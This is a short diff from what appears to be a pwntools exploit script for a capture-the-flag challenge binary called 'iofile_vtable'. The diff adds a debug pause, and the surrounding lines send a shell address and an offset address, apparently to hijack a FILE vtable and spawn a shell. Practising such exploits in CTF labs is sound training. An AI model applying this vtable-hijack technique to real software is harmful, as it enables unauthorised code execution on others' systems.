@@ -12,6 +12,7 @@ p = process('iofile_vtable')
 p.sendlineafter(': ', p64(addr_shell))
 
 p.sendlineafter('> ', '4')
+raw_input('debug: ' + str(p.pid))
 p.sendlineafter(': ', p64(addr_name - 0x38))
 
 p.sendlineafter('> ', '2')
